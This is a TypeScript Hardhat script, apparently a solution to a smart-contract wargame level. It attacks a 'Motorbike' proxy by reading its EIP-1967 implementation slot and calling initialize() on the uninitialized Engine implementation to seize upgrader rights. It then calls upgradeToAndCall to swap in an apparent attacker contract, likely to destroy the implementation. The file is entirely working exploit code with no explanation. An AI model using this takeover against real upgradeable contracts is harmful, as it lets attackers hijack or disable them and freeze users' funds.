import { ethers } from 'hardhat';
import hre from 'hardhat';

async function main() {
  //   const contract_name = 'EngineAttack';
  //   const Contract = await ethers.getContractFactory(contract_name);
  //   const contract = await Contract.deploy();
  //     await contract.deployed();
  //     console.log(
  //       `Deployed contract to address: ${contract.address} on network: ${hre.network.name}`
  //     );

  const motorbike_address = '0x5eF758dD2Eb27fA5d1124EF64714e65a3663BC8f';
  const engine_address = await ethers.provider.getStorageAt(
    motorbike_address,
    '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
  );

  // Slice the last 20 bytes
  const engine_address_20 = '0x' + engine_address.slice(26);
  console.log(engine_address_20);

  // Get Engine abi
  const engine = await hre.ethers.getContractAt('Engine', engine_address_20);

  await engine.initialize();

  console.log('engine initalized');
  const owner_ = await engine.upgrader();
  console.log('owner is: ', owner_);

  await engine.upgradeToAndCall(
    '0x2f4353b43B113273CB09c60E4BAF05E27ca8D981',
    '0x9cb8a26a'
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
